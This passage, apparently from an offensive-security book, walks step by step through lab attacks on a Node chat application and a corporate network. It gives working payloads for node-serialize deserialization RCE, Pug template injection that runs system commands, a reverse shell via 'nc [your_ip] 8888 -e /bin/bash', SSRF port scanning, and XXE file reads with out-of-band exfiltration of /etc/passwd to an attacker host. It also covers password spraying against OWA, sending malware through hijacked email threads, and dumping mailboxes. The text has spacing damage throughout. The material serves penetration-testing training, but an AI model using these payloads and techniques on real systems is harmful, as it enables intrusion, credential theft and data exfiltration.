commands here', function(error , stdout, stderr) { console.log(stdout) });} ()\"} the json object above will pass the following request “() {require('child_process').exec('ls')” into the eval statement within the unserialize function, giving us remote code execution. the last part to notice is that the ending parenthesis was added \"()\" because without it our function would not be called. ajin abraham, the original researcher who discovered this vulnerability , identified that using immediate ly invoked function expressions or iife (https://en.wikipedia.or g/wiki/immediatelyinvoked_function_expression) would allow the function to be executed after creation. more details on this vulnerability can be found here: https://cve.mitre.or g/cgi-bin/cvename.cgi?name=cve-2017-5941. in our chat application exampl e, we are going to look at the cookie value, which is being deserialized using this vulnerable library: go to http://chat:3000 proxy the traf fic in burp and look at the cookies identify one cookie name \"donotdecodeme\" copy that cookie into burp suite decoder and base64 decode it as previously mentioned, every language has its unique oddities and nodejs is no different. in node/expres s/pug, you are not able to write directly to the web directory and have it accessible like in php. there has to be a specified route to a folder that is both writable and accessible to the public internet. creating the payload before you start, remember all these payloads for the lab are in an easy to copy/paste format listed here: http://bit.ly/2qbdrfo take the original payload and modify your shell execution \"'do system commands here\" {\"thp\":\"_$$nd_func$$_function () {require('child_process').exec('do system commands here', function(error , stdout, stderr) { console.log(stdout) });}()\"} example: {\"thp\":\"_$$nd_func$$_function () {require('child_process').exec('echo node deserialization is awesome!! >> /opt/web/chatsupportsystems/public/hacked.txt', function(error , stdout, stderr) { console.log(stdout) });}()\"} as the original cookie was encoded, we will have to base64 encode our payload via burp decoder/encoder example payload: eyj0ahaioijfjcrorf9gvu5djcrfznv uy3rpb24 gkcl7cmvxdwlyzsgny2hpbgrfchjvy2vzcycplm v4zwmoj2vjag8gbm9kzsbkzxnlcmlhbgl6yxrp b24gaxmgyxdlc29tzsehid4+ic9vchqvd2v il2no yxr tdxbwb3j0u3lzdgvtcy9wdwjsawmvagfja2 vklnr4dccsigz1bmn0aw9ukgv ycm9ylcbzdgr vdxqsihn0zgv ycikgeybjb25zb2xllmxvzyhzdgrv dxqpih0po30oksj9 log out, turn burp intercept on, and relay a request for / (home) modify the cookie to the newly created base64 payload forward the traf fic and since the public folder is a route for /, you should be able to open a browser and go to http://chat:3000/hacked.txt you now have remote code execution! feel free to perform post exploitation on this system. start by trying to read /etc/passwd. in the source for the node-serialize module, we see that the function expression is being evaluated , which is a serious proble m for any javascript/nodejs application that does this with user input. this poor practice allowed us to compromise this application. references: https://opsecx.com/index.php/2017/02/08/exploiting-node-jsdeserialization-bug-for -remote-code-execution/ https://github.com/luin/serialize https://snyk.io/test/npm/node-serialize? severity=high&severity=medium&severity=low https://blog.websecurify .com/2017/02/hacking-nodeserialize.html template engine attacks - t emplate injections template engine s are being used more often due to their modularity and succinct code compared with standard html. template injection is when user input is passed directly into render templates, allowing modification of the unde rlying template. this can occur intentionally in wikis, wsywig, or email templates. it is rare for this to occur unintentionally , so it is often misinterpreted as just xss. template injection often allows the attacker to access the underlying operating system to obtain remote code execution. in our next exam ple, you will be performing template injectio n attacks on our nodejs application via pug. we are unintentionally exposing ourselves to template injection with a meta redirect with user input, which is being rendered directly in pug using template literals `${}`. it is important to note that template literals allow the use of newline characters, which is required for us to break out of the parag raph tag since pug is space- and newlinesensitive, similar to python. in pug, the first character or word represents a pug keyword that denotes a tag or function. you can specify multiline strings as well using indentation as seen below: p. this is a paragraph indentation. this is still part of the paragraph tag. here is an example of what html and pug t emplate would look like: the example text above shows how it would look in html and how the corresponding pug markup language would look like. with templates and string interpolation, we can create quick, reusable, and ef ficient templates template injection example the chat applic ation is vulnerable to a template injection attack. in the following application, we are going to see if we can interact with the pug templating system. this can generally be done by checking if the input parameter we supply can process basic operations. james kettle wrote a great paper on attack templates and interacting with the underlying template systems (http://ubm.io/2ectysi). interacting with pug: go to http://chat:3000 and login with any valid account go to http://chat:3000/directmessage and enter user and comment and 'send' next, go back to the directmessage and try entering an xss payload into the user parameter <script>alert(1)</script> http://chat:3000/ti? user=%3cscript%3ealert%281%29%3c%2fscript%3 e&comment=&link= this shows the application is vulnerable to xss, but can we interact with the templating system? in burp history , review the server request/response to the endpoint point /ti?user=, and send the request to burp repeater (ctrl+r) testing for basic operations we can test our xss vulnerable parameter for template injections by passing it in an arithmetic string. if our input is evaluated, it will identify that it is vulnerable to template injection. this is because templates, like coding languages, can easily support evaluating arithmetic operators. testing basic operators: within burp repeater , test each of the parameters on /ti for template injection. we can do this by passing a mathematical operation such as 9*9. we can see that it did not work and we did not get 81. keep in mind that our user input is wrapped inside paragraph tags, so we can assume our pug template code looks something like this: p message has been sent to !{user} taking advantage of pug features: as we said earlier, pug is white space delimited (similar to python) and newlines start a fresh template input, which means if we can break out of the current line in pug, we can execute new t emplate code. in this case we are going to break out of the paragraph tag (<p>), as shown above, and execute new malicious template code. for this to work, we are going to have to use some url encoding to exploit this vulnerability (http://bit.ly/2qxediy). let's walk through each of the requirements to perform template injection: first, we need to trigger a new line and break out of the current template. this can be done with the following character: %0a new line second, we can utilize the arithmetic function in pug by using a \"=\" sign %3d percent encoded \"=\" sign lastly , we can put in our mathematical equation 9*9 mathematical equation so, the final payload will look like this: [newline]=9*9 url coded: get /ti? user=%0a%3d9*9&comment=&link= /ti?user=%0a%3d9*9 gives us 81 in the response body . you have identified template injecti on in the user parameter! let's get remote code execution by abusing javascript. as you can see in the response , instead of the name of the user, we have “81” outside the paragraph tags! this means we were able to inject into the template. we now know that we have some sort of template injection and that we are able to perform simple calculations, but we need to see if we can get shell execution. to get shell execut ion, we have to find the right function to perform execution in node/javascript. first, we will identify the self global object root and proceed with determining which modules and functions we have access to. w e want to eventually use the require function to import the child_process .exec to run operating system commands. in pug, the \"=\" character allows us to output the javascript results. w e will start by accessing the global root: [new line]=global encoding the above expression to url encoding using burp's decoder tool gives us: %0a%3d%20%67%6c%6f%62%61%6c use the above url encoding string as the user value and resend. if all goes well after submitting the prior request, we will see [object global], which means we have access to the global object. parsing the global object: let's see what objects and properties we have access to by using the pug iterator 'each’ within global. remember the newline (%0a) and white space (%20): each val,index in global p= index url encoded: %0a%65%61%63%68%20%76%61%6c%2c%69%6e%6 4%65%78%20%69%6e%20%67%6c%6f%62%61%6c%0 a%20%20%70%3d%20%69%6e%64%65%78 in the above example, we are using the 'each' iterator which can access a value and optionally access an index if we specify for either arrays or objects. w e are trying to find what objects, methods, or modules we have access to in the global object. our ultimate goal is to find something like the \"require\" method to allow us to \"require\" child process .exec, which allows us to run system commands. from here on out, we are just using trial and error to identify methods or objects that will eventually give us the require method. finding the code execution function: from the previous request, we saw all the objects within global and one that was named “process”. next, we need to identify interesting objects we have access to within global.process: each val,index in global.process p= index url encoded: %0a%65%61%63%68%20%76%61%6c%2c%69%6e %64%65%78%20%69%6e%20%67%6c%6f%62%61 %6c%2e%70%72%6f%63%65%73%73%0a%20%20 %70%3d%20%69%6e%64%65%78 we chose “process” out of all the available methods because we knew it would eventually lead to 'require'. y ou can try the trial and error process by choosing dif ferent methods to iterate through: each val,index in global.process.mainmodule p= index url encoded: %0a%65%61%63%68%20%76%61%6c%2c%69%6e%6 4%65%78%20%69%6e%20%67%6c%6f%62%61%6c%2 e%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4 d%6f%64%75%6c%65%0a%20%20%70%3d%20%69% 6e%64%65%78 remote code execution: sending this final payload, we should see the \"require\" function within global.process.mainmodule. w e can now set this to import a 'child_process' with .exec to obtain rce: - var x = global.process.mainmodule.require - x('child_process').exec('cat /etc/passwd >> /opt/web/chatsupportsystems/public/accounts.txt') url encoded: %0a%2d%20%76%61%72%20%78%20%3d%20%6 7%6c%6f%62%61%6c%2e%70%72%6f%63%65%7 3%73%2e%6d%61%69%6e%4d%6f%64%75%6c%6 5%2e%72%65%71%75%69%72%65%20%0a%2d% 20%78%28%27%63%68%69%6c%64%5f%70%72% 6f%63%65%73%73%27%29%2e%65%78%65%63% 28%27%63%61%74%20%2f%65%74%63%2f%70% 61%73%73%77%64%20%3e%3e%20%2f%6f%70% 74%2f%77%65%62%2f%63%68%61%74%53%75% 70%70%6f%72%74%53%79%73%74%65%6d%73% 2f%70%75%62%6c%69%63%2f%61%63%63%6f% 75%6e%74%73%2e%74%78%74%27%29 in the above example, we are defining a variable “x” like we would in javascript, but the dash at the beginning of the line denotes an unbuf fered output (hidden). w e are using the global object with the modules that we needed to eventually get 'require', which allows us to use 'child_process' .exec to run system commands. we are outputting the contents of /etc/passwd to the web public root directory , which is the only directory we have write access to (as designed by the app creators), allowing the user to view the contents. w e could also do a reverse shell or anything else allowable with system commands. we can see http://chat:3000/accounts.txt will contain the contents of /etc/passwd from the web server . use this to perform a full rce on the system and get a shell back. now , can we automate a lot of this? of course we can. a tool called tplmap (https://github.com/epin na/tplmap) runs similar to sqlmap in that it tries all the dif ferent combinations of template injections: cd /opt/tplmap ./tplmap.py -u \"http://chat:3000/ti? user=*&comment=asdfasdf&link=\" reference: http://blog.portswigger .net/2015/08/server -side-templateinjection.html https://hawkinsecurity .com/2017/12/13/rce-via-spring-enginessti/ javascript and remote code execution remote code execution is what we look for in every assessment and web application penetration test. although rces can be found just about everywhere, they are most commonly found in places that allow uploads, such as: uploading a web shell, an exploit like imagetragick (https://imagetragick.com/), xxe attacks with office files, directory traversal-based uploads to replace critical files, and more. traditionally , we might try to find an upload area and a shell that we could utilize. a great list of differen t types of webshell payloads can be found here: https://github.com/tennc/w ebshell. please note, i am in no way vetting any of these shells—use them at your own risk. i have run into a lot of web shells that i found on the internet which contained. attacking the v ulnerable chat application with upload in our lab, we are going to perfo rm an upload rce on a node application. in our example, there is a file upload feature that allows any file upload. unfortunately , with node, we can't just call a file via a web browser to execute the file, like in php . so, in this case, we are going to use a dynamic routing endpoint that tries to render the contents of pug files. the error lies in the fact that the endpoint will read the contents of the file assuming it is a pug file since the default directory exists within the views directory . path traversal and local file read vulnerabilities also exist on this endpoint. during the upload process, the file handler module will rename the file to a random string of characters with no extension. within the upload response contents of the page, there exists the server path location of the uploaded file. using this information, we can use /drouting to perform template injection to achieve remote code execution. since we know the underlying application is node (javascript), what kind of payload could we upload to be executed by pug? going back to the simple example that we used earlier: first, assign a variable to the require module -var x = global.process.mainmodule.require use of the child process module enables us to access operating system functionalities by running any system command: -x('child_process').exec('nc [your_ip] 8888 -e /bin/bash') rce upload attack: go to http://chat:3000 and login with any valid account upload a text file with the information below . in pug the \"-\" character means to execute javascript. -var x = global.process.mainmodule.require -x('child_process').exec('nc [your_ip] 8888 -e /bin/bash') review the request and respon se in burp from uploading the file. you will notice a hash of the file that was uploaded in the response post request and a reference to drouting. in this template code, we are assigning the require function to child_process .exec, which allows us to run commands on the operating system level. this code will cause the web server to connect to our listener running on [your_ip] on port 8888 and allow us to have shell on the web server . on the attacker machine, start a netcat listener for the shell to connect back nc -l -p 8888 we activate the code by running the endpoint on /drouting. in a browser , go to your uploaded hashfile. the drouting endpoin t takes a specified pug template and renders it. fortunately for us, the pug template that we uploaded contains our reverse shell. in a browser , access the drouting endpoint with your file as that was recovered from the response of the file upload. we use the directory traversal \"../\" to go one directory lower to be able to get into the uploads folder that contains our malicious file: /drouting?filename=../uploads/[your file hash] go back to your terminal listening on 8888 and interact with your shells! server side request forgery (ssrf) server side request forgery (ssrf) is one of those vulnerab ilities that i feel is generally misunderstood and, terminology-wise, often confused in name with cross-site request forgery (csrf). although this vulnerability has been around for a while, it really hasn't been discuss ed enough, especially with such severe consequences. let's take a look into the what and why . server side request forgery is generally abused to gain access onto the local system, into the internal network, or to allow for some sort of pivoting. the easiest way to understand ssrf is walking through an example. let's say you have a public web application that allows users to upload a profile image by url from the internet. you log into the site, go to your profile, and click the button that says update profile from imgur (a public image hosting service). you supply the url of your image (for example: https://i.imgur .com/fdtlofi.jpg) and hit submit. what happens next is that the server creates a brand new request, goes to the imgur site, grabs the image (it might do some image manipulation to resiz e the image —imagetragick anyone?), saves it to the server , and sends a success message back to the user. as you can see, we supplied a url, the server took that url and grabbed the image, and uploaded it to its database. we originally supplied the url to the web application to grab our profile picture from an external resource. however , what would happen if we pointed that image url to http://127.0.0.1:80/favicon.ico instead? this would tell the server instead of going to something like imgur , to grab the favicon.ico from the local host webserver (which is itself). if we are able to get a 200 message or make our profile picture the localhost favicon, we know we potentially have an ssrf . since it worked on port 80, what would happen if we tried to connect to http://127.0.0.1:8080, which is a port not accessible except from localhost? this is where it gets interesting. if we do get full http request/responses back and we can make get requests to port 8080 locally , what happens if we find a vulner able jenkins or apache tomcat service? even though this port isn't publicly listening, we might be able to compromise that box. even better, instead of 127.0.0.1, what if we started to request internal ips: http://192.168.10.2-254? think back to those web scanner findings that came back with internal ip disclosures, which you brushed off as lows— this is where they come back into play and we can use them to abuse internal network services. an ssrf vulnerability enables you to do the following: 1. access services on loopback interface 2. scan the internal network and potentially interact with those services (get/post/head) 3. read local files on the server using file:// 4. abuse a ws rest interface (http://bit.ly/2elv5zz) 5. move laterally into the internal environment in our following diagram, we are finding a vulnerable ssrf on a web application that allows us to abuse the vulnerability: let's walk thr ough a r eal life example: on your chat support system (http://chat:3000/) web application, first make sure to create an account and log in. once logged in, go to direct message (dm) via the link or directly through http://chat:3000/directmessage. in the \"link\" textbox, put in a website like http://cyberspacekittens.com and click the preview link. you should now see the http://cyberspacekittens.com page render , but the uri bar should still point to our chat application. this shows that the site is vulnerable to ssrf . we could also try something like chat:3000/ssrf? user=&comment=&link=http://127.0.0.1:3000 and point to localhost. notice that the page renders and that we are now accessing the site via localhost on the vulnerable server . we know that the application itself is listening on port 3000. we can nmap the box from the outside and find that no other web ports are currently listening, but what services are only available to localhost? to find this out, we need to bruteforce through all the ports for 127.0.0.1. we can do this by using burp suite and intruder . in burp suite, go to the proxy/http history t ab and find the request of our last ssrf . right-click in the request body and send to intruder . the intruder tab will light up, go to the positions t ab and click clear . click and highlight over the port \"3000\" and click add. y our get request should look like this: get /ssrf? user=&comment=&link=http://127.0.0.1:§3000§ http/1.1 click the payloads tab and select payload t ype \"numbers\". w e will go from ports 28000 to 28100. normally , you would go through all of the ports, but let's trim it down for the lab. from: 28000 to: 28100 step: 1 click \"start attack\" you will see that the response length of port 28017 is much larger than all the other requests. if we open up a browser and go to: http://chat:3000/ssrf? user=&comment=&link=http://127.0.0.1:28017, we should be able to abuse our ssrf and gain access to the mongodb w eb interface. you should be able to access all the links, but you have to remember that you need to use the ssrf. to access the serverstatus (http://chat:3000/serverstatus?text=1), you will have to use the ssrf attack and go here: http://chat:3000/ssrf? user=&comment=&link=http://127.0.0.1:28017/serverstatus? text=1. server side request forgery can be extremely dangerous. although not a new vulnerabili ty, there is an increasing amount of ssrf vulnerabilities that are found these days. this usually leads to certain critical findings due to the fact that ssrfs allow pivoting within the infrastructure. additional resources: lots on encoding localhost: http://www .agarri.fr/docs/appseceu15server_side_browsing_considered_harmful.pdf bug bounty - airbnb example: http://bit.ly/2elvjxp xml external entities (xxe) xml stands for extensible markup language and was designed to send/store data that is easy to read. xml external entities (xxe) is an attack on xml parsers in applications. xml parsing is commonly found in applications that allow file uploads, parsing office documents, json data, and even flash type games. when xml parsing is allowe d, improper validation can grant an attacker to read files, cause denial of service attacks, and even remote code execution . from a high level, the application has the following needs 1) to parse xml data supplied by the user, 2) the system identifier portion of the entity must be within the document type declaration (dtd), and 3) the xml processor must validate/process dtd and resolve external entities. normal xml file malicious xml <?xml version=\"1.0\" encoding=\"iso-8859-1\"?> <prod> <type>book</type> <name>thp</name> <id>100</id> </prod> <?xml version=\"1.0\" encoding=\"utf-8\"?> <!doctype test [ <!entity xxe system \"file:///etc/passwd\"> ]> <xxx>&xxe;</xxx> above, we have both a normal xml file and one that is specially crafted to read from the system's /etc/passwd file. we are going to see if we can inject a malicious xml request within a real xml request. xxe lab: due to a custom configuration request, there is a different vmw are virtual machine for the xxe attack. this can be found here: http://thehackerplaybook.com/get.php?type=xxe-vm once downloade d, open the virtual machine in vmw are and boot it up. at the login screen, you don't need to login, but you should see the ip address of the system. go to browser: proxy all traf fic through burp suite go to the url: http://[ip of your v irtual machine] intercept traf fic and hit \"hack the xml\" if you view the html source code of the page after loading it, there is a hidden field that is submitted via a post request. the xml content looks like: <?xml version=\"1.0\" ?> <!doctype thp [ <!element thp any> <!entity book \"universe\"> ]> <thp>hack the &book;</thp> in this example , we specified that it is xml version 1.0, doctype, specified the root element is thp, !element specifies any type, and !entity sets the book to the string \"universe\". lastly , within our xml output, we want to print out our entity from parsing the xml file. this is normall y what you might see in an application that sends xml data. since we control the post data that has the xml request , we can try to inject our own malicious entities. by default, most xml parsing libraries support the system keyword that allows data to be read from a uri (including locally from the system using the file:// protoc ol). so we can create our own entity to craft a file read on /etc/passwd. original xml file malicious xml <?xml version=\"1.0\" ?> <!doctype thp [ <!element thp any> <!entity book \"universe\"> ]> <thp>hack the &book;</thp><?xml version=\"1.0\" ?> <!doctype thp [ <!element thp any> <!entity book system \"file:///etc/passwd\"> ]> <thp>hack the &book;</thp> xxe lab - read file: intercept traf fic and hit \"hack the xml\" for [ip of y our vm]/xxe.php send the intercepted traf fic to repeater modify the \"data\" post parameter to the following: <?xml version=\"1.0\" ?><!doctype thp [ <!element thp any><!entity book system \"file:///etc/passwd\">]><thp>hack the %26book%3b</thp> note that %26 = & and %3b = ;. w e will need to percent encode the ampersand and semicolon character . submit the traf fic and we should be able to read /etc/passwd advanced xxe - out of band (xxe-oob) in the previous attack, we were able to get the response back in the <thp> tags. what if we couldn’ t see the response or ran into character/file restrictions? how could we get our data to send out of band (oob)? instead of defining our attack in the request payload, we can supply a remote document type definiti on (dtd) file to perform an oob-xxe. a dtd is a well-structured xml file that defines the structure and the legal elements and attributes of an xml document. for sake of ease, our dtd will contain all of our attack/exfil payloads, which will help us get around a lot of the character limitations. in our lab example, we are going to cause the vulnerable xxe server to request a dtd hosted on a remote server . our new xxe attack will be performed in four stages: modified xxe xml attack for the v ulnerable xml parser to grab a dtd file from an attacker's server dtd file contains code to read the /etc/passwd file dtd file contains code to exfil the contents of the data out (potentially encoded) setting up our attacker box and xxe-oob payload: instead of the original file read, we are going to specify an external dtd file <!entity % dtd system \"http://[y our_ip]/payload.dtd\"> %dtd; the new \"data\" post payload will look like the following (remember to change [y our_ip]): <?xml version=\"1.0\"?><!doctype thp [<!element thp any ><!entity % dtd system \"http://[your_ip]/payload.dtd\"> %dtd;]> <thp><error>%26send%3b</error></thp> we are going to need to host this payload on our attacker server by creating a file called payload.dtd gedit /var/www/html/payload.dtd <!entity % file system \"file:///etc/passwd\"> <!entity % all \"<!entity send system 'http://[y our_ip]:8888/collect=%file;'>\"> %all; the dtd file you just created instructs the vulnerable server to read /etc/passwd and then try to make a web request with our sensitive data back to our attacker machine. t o make sure we receive our response, we need to spin up a web server to host the dtd file and set up a netcat listener nc -l -p 8888 you are going to run across an error that looks something like the following: simplexml_load_string(): parser error : detected an entity reference loop in <b>/var/www/html/xxe.php</b> on line <b>20. when doing xxe attacks, it is common to run into parser errors. many times xxe parsers only allow certain characters, so reading files with special characters will break the parser . what we can do to resolve this? in the case with php , we can use php input/output streams (http://php.net/manual/en/wrappers.php.ph p) to read local files and base64 encode them using php://filter/read=convert.base64-encode. let's restart our netcat listener and change our payload.dtd file to use this feature: <!entity % file system \"php://filter/read=convert.base64encode/resource=file:///etc/passwd\"> <!entity % all \"<!entity send system 'http://[y our_ip]:8888/collect=%file;'>\"> %all; once we repeat our newly modi fied request, we can now see that our victim server first grabs the payload.dtd file, processes it, and makes a secondary web request to your netcat handler listening on port 8888. of course, the get request will be base64 encoded and we will have to decode the request. more xxe payloads: https://gist.github.com/staaldraad/01415b990939494879b4 https://github.com/danielmiessler/seclists/blob/master/fuzzing/ xxe-fuzzing.txt c o n c l u s i o n although this is only a small glimpse of all the different web attacks you may encounter , the hope was to open your eyes to how these newer frameworks are introducing old and new attacks. many of the common vulnerability and application scanners tend to miss a lot of these more complex vulnera bilities due to the fact that they are language or framework specific. the main point i wanted to make was that in order to perform an adequate review , you need to really understand the language and frameworks. 4 the drive - compromising the network on day two of your assessment, you ran nmap on the whole network, kicked off vulne rability scanners with no luck, and were not able to identify an initia l entry point on any of their web applications. slight ly defeated, you take a step back and review all your reconnaissance notes. you know that once you can get into the network, there are a myriad of tricks you can use to obtain more credentials, pivot between boxes, abuse features in active directory , and find the space loot we all crave. of course , you know that it won't be an easy task. there will be numerous trip wires to bypass, guards to misguide, and tracks to cover . in the last thp book, the drive section focused on using findings from the vulnerability scanners and exploiting them. this was accomplished using tools like metasploit, printer exploits, heartbleed, shellshock, sql injections, and other types of common exploits. more recently , there have been many great code execution vulnerabilities like eternal blue (ms01710), multiple jenkins exploits, apache struts 2, cms applic ations, and much more. since this is the red team version of thp, we won't focus extensively on how to use these tools or exploits for specific vulnerabilities. instead, we will focus on how to abuse the corporate environments and live of f of the land. in this chapter , you will be conc entrating on red team tactics, abusing the corporate infras tructure, gettin g credentials, learning about the internal network, and pivoting between hosts and networks. we will be doing this without ever running a single vulnerability scanner . finding credentials from outside the network as a red teamer , finding the initial entry point can be compl ex and will require plenty of resources. in the past books, we have cloned our victim's authentication pages, purchased doppelganger domains, target spear phished, created custom malware, and more. sometimes, i tell my red teams to just . . . keep it simple . many times we come up with these crazy advan ced plans, but what ends up working is the most basic plan. this is one of the easiest... one of the most basic techniques that has been around is password bruteforcing. but, as red teamers, we must look at how to do this smartly . as companies grow , they require more technologies and tools. for an attacker , this definitely opens up the playing field. when companies start to open to the internet, we start to see authentication required for email (i.e. office 365 or owa), communication (i.e. lync, xmpp , webex) tools, collaboration tools (i.e. jira, slack, hipchat, huddle), and other external services (i.e. jenkins, cms sites, support sites). these are the targets we want to go after . the reason we try to attack these servers/services is because we are looking for applications that authenticate against the victim’ s ldap/active directory (ad) infrastructure. this could be through some ad federation, single signon process, or directly to ad. we need to find some common credentials to utilize in order to move on to the secondary attack. from the reconnaissance phase, we found and identified a load of email and username accounts, which we will use to attack through what is called password spray ing. we are going to target all the different applications and try to guess basic passwords as we’ve seen this in real world apt style campaigns (us-cer t article: http://bit.ly/2qyb9rb) why should we test authentication against dif ferent external services? some authentication sources do not log attempts from external services although we generally see email or vpn requiring two-factor authentication, externally-facing chat systems may not password reuse is very high sometimes external services do not lock out ad accounts on multiple bad attempts there are many tools that do bruteforcing, however , we are going to focus on just a couple of them. the first one is a tool from spiderlabs (http://bit.ly/2ejve6n) called spray . although spray is a little more complicated to use, i really like the concept of the services it sprays. for example, they support smb, ow a, and l ync (microsoft chat). to use spray , you specify the following: spray .sh -owa <tar getip> <usernamelist> <passwordlist> <attemptsperlockoutperiod> <lockoutperiodinminutes> <domain> as you will see in the example below , we ran it against a fake owa mail server on cyberspacekittens (which doesn't exist anymore) and when it got to peter with password spring2018, it found a successful attem pt (you can tell by the data length). a question i often get involves which passwords to try, as you only get a number of password attempts before you lock out an account. there is no right answer for this and is heav ily dependent on the company . we used to be able to use very simple passwords like \"password123\", but those have become more rare to find. the passwords that do commonly give us at least one credential are: season + y ear local sports t eam + digits look at older breaches, find users for the tar get company and use similar passwords company name + y ear/numbers/special characters (!, $, #, @) if we can get away with it, we run these scans 24/7 slowly , as not to trigger any account lockouts. remember , it only takes one password to get our foot in the door! this is a quick script that utilizes curl to authenticate to ow a. configuring spray is pretty simple and can be easily converte d for other applications. what you need to do is capture the post request for a password attempt (you can do this in burp suite), copy all the request data, and save it to a file. for any fields that will be bruteforced, you will need to supply the string \"sprayuser\" and \"spraypassword\". for example, in our case the post-request.txt file would look like the following: post /owa/auth.owa http/1.1 host: mail.cyberspacekittens.com user-agent: mozilla/5.0 (x1 1; linux x86_64; rv:52.0) gecko/20100101 firefox/52.0 accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 accept-language: en-us,en;q=0.5 accept-encoding: gzip, deflate referer: https://mail.cyberspacekittens.com/owa/auth/logon.aspx? replacecurrent=1&url=https%3a%2f%2fmail.cyberspacekittens.com% 2fowa%2f cookie: clientid=vcsjkt0fkwjdyjzixq; privatecomputer=true; pback=0 connection: close upgrade-insecure-requests: 1 content-t ype: application/x-www-form-urlencoded content-length: 131 destination=https%3a%2f%2fcyberspacekittens.com%2fowa%2f&fl ags=4&forcedownlevel=0&username= sprayuser @cyberspacekittens.c om&password= spraypassword &passwordt ext=&isutf8=1 as mentioned before, one addit ional benefit of spray .sh is that it supports smb and lync as well. another tool that takes advantage of and abuses the results from spraying is called ruler (https://github.com/sensepost/ruler). ruler is a tool written by sensepost that allows you to interact with exchange servers through either the mapi/http or rpc/http protocol. although we are mainly going to be talking about using ruler for bruteforcing/info-gathering, this tool also supports some persistence exploitation attacks, which we will lightly touch on. the first feature we can abuse is similar to the spray tool, which bruteforces through users and passwords. ruler will take in a list of usernames and passwords, and attempt to find credentials. it will automatically try to autodiscover the necessary exchange configurations and attempt to find credentials. t o run ruler: ruler --domain cyberspacekittens.com brute --users ./users.txt -passwords ./passwords.txt once we find a single passwor d, we can then use ruler to dump all the users in the o365 global address list (gal) to find more email addresses and the email groups to which they belong. taking these email addresses, we should be able to send all these accounts through the bruteforce tool and find even more credentials—this is the circle of passwords. the main purpose of the ruler tool though, is that once you have credentials, you can abuse \"features\" in office/outlook to create rules and forms on a victim's email account. here is a great write-up from sensepost on how they were able to abuse these features to execute macros that contain our empire payload: https://sensepost.com/blog/2017/outlook-forms-and-shells/. if you don't decide to use the outlook forms or if the features have been disabled, we can always go back to the good ol' attacks on email. this is where it does make you feel a little dirty, as you will have to log in as one of the users and read all their email. after we have a couple good chuckles from reading their emails, we will want to find an existing conversation with someone who they seem to trust somewhat (but not good friends). since they alrea dy have a rapport built, we want to take advantage of that and send them malware. typically , we would modify one of their conversations with an attachme nt (like an office file/executable), resend it to them, but this time with our malicious agent. using these trusted connections and emails from internal addresses provides great cover and success. one point i am going to keep mentioning throughout the book is that the overall campaig n is built to test the blue teams on their detection tools/processes. we want to do certain tasks and see if they will be able to alert or be able to forensically identify what happened. for this portion of the lab, i love validating if the company can determine that someone is exfiltrating their users’ emails. so, what we do is dump all of the compromised emails using a python script: https://github.com/narcolapser/python-o365#email. in many cases, this can be gigabytes of data! advanced lab a great exercise would be to take the different authentication type services and test them all for passwords. try and build a password spray tool that tests authentication against xmpp services, common third-party saas tools, and other common protocols. even better would be to do this from multiple vps boxes, all controlled from a single master server . moving through the network as a red teamer , we want to move through the network as quietly as possible. we want to use \"features\" that allow us to find and abuse information about the network, users, services, and more. generally , on a red team camp aign, we do not want to run any vulnerability scans within an environment. there are even times where we might not even want to run a nmap scan against an internal network. this is because many companies have gotten pretty good at detec ting these types of sweeps, especially when running something as loud as a vulnerability scanner . in this section, you will be focusing on moving through cyber space kittens' network without setting off any detections. we will assume you have already somehow gotten onto the network and started to either look for your first set of credentials or have a shell on a user's machine. setting up the envir onment - lab network this part is completely optional, but because of microsoft licensing, there aren't any pre-canned vm labs to follow with the book. so it is up to you now to build a lab! the only way to really learn how to attack environments it to fully build it out yourself. this gives you a much clearer picture of what you are attacking, why the attacks work or fail, and understand limitations of certain tools or processes. so what kind of lab do you need to build? you will probably need one for both windows and linux (and maybe even mac) based on your client's environment. if you are attacking corporate networks, you will probably have to build out a full activ e directory network. in the following lab, we will go over how to build a lab for all the examples in this book. an ideal windows testing lab for you to create at home might look something like the following: domain controller - server: [ w indows 2016 domain controller] web server: [iis on w indows 2016] client machines: [w indows 10] x 3 and [w indows 7] x 2 all running on vmw are w orkstation with at least 16 gb of ram and 500gb ssd hard drive configuring and creating a domain controller: microsoft directions on building a 2016 server: https://blogs.technet.microsoft.com/canitpro/2017/02/ 22/step-by-step-setting-up-active-directory-inwindows-server -2016/ bit.ly link: http://bit.ly/2jn8e19 once active directory is installed and configured, create users and groups with: dsac.exe create multiple users create groups and assign to users: space helpdesk lab set up client machines (w indows 7/10) to join the domain: update all machines join the machines to the domain https://helpdeskgeek.com/how-to/windows-joindomain/ make sure to add one domain user with the ability to run as local administrator on each box. this can be accomplished by adding that domain user to the local administrators group on the local machine. enable local administrator on each host and set password set up gpo to: disable firewall (https://www .youtube.com/watch? v=vxxljsbx1si) disable a v (http://bit.ly/2el0utd) disable updates add helpdesk to the local administrators group only allow login for domain admins, local administrators, helpdesk (http://bit.ly/2qyjs5d) lastly , link your gpo to your root domain set all users for each os to autologin (it just makes life much easier for testing). every time a machine starts or reboots, it will autologin so that we can easily test attacks that pull credentials from memory: https://support.microsoft.com/en-us/help/324737/how-to-turnon-automatic-logon-in-windows bit.ly link: http://bit.ly/2ekatik set up iis server and configure spn: https://www .rootusers.com/how-to-install-iis-in-windowsserver -2016/ bit.ly link: http://bit.ly/2jjqvrk https://support.microsoft.com/en-us/help/929650/how-to-usespns-when-you-configure-web-applications-that-are-hosted-on bit.ly link: http://bit.ly/2ixzygl on the network with no credentials let’s say you were unable to get any passwords from spraying their external service s and therefore decide that you want to sneak into the building. you wait until after lunchtime, walk over to their cyber space kittens' offices, and find the smokers door. even though you don't smoke, you know that the smokers have that gang mentality . you light up a cigarette, chat with the workers about nothing, and as they walk into their building, you follow them in . . . no questions asked! now that you have broken into the csk facility , you don't want to get caught by stayin g there too long. you pull out your trusty drop box, find an empty office, plug it into the network, check your phone to see that it beaconed home, and swiftly walk back to safety . slightly sweating at home, you quickly jump onto your laptop, log into your vpn server, and give a sigh of relief as your drop box beacons are still connecting home. now that you can ssh into your drop box, which contains all your hacker tools, you can slowly discover the clien t's network, pivot between boxes, and try to get to the data you care about. responder just like in the previous campaign, we used responder (https://github.com/lgandx/responder) to listen on the network and spoof responses to gain credentials on the network. as a recap from the hacker playbook 2, when a system on the network makes a dns hostn ame lookup that fails, that victim system uses link-local multicast name resolution (llmnr for short) and the net-bios name service (nbt -ns) for fallback name resolution. when that victim pc fails the dns lookup , the victim starts asking anyone on the network if they know the resolution for that hostname. an easy and general example: let's say your pc has a fixed mounted drive for \\\\cyberspace kittenssecretdrive\\secrets. one day, 